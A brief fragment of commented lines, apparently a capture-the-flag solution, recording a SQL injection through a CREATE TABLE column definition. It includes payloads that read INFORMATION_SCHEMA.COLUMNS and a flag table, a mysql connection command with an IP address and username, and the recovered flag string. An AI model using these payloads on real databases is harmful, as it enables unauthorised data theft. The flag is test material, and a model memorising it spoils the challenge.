...
# hoge` TEXT) SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS; --
# mysql -h 35.193.26.163 -u sgoewwelbkxlzp -p cloudtable
# select distinct table_name from ggejodlourwjig where TABLE_SCHEMA = "cloudtable";

# hoge` TEXT) SELECT flag FROM cloudtable.flag; --
# we{1cf8b0f2-7659-4277-b1be-8b50b1d1e046@Sq1_Injection_By_Cr3ate}
